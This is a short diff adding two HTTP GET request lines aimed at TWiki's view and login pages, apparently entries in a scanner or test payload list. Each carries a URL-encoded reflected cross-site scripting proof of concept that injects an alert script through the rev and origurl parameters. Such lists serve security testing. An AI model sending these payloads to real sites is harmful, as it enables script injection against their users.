@@ -1,0 +1,2 @@
+GET /twiki/bin/view?rev=%27%3E%3Cscript%3Ealert%28Hello%29%3C/script%3E
+GET /twiki/bin/login?origurl=&ANYTHING%27%3E%3Cscript%3Ealert%28Hello%29%3C/script%3E
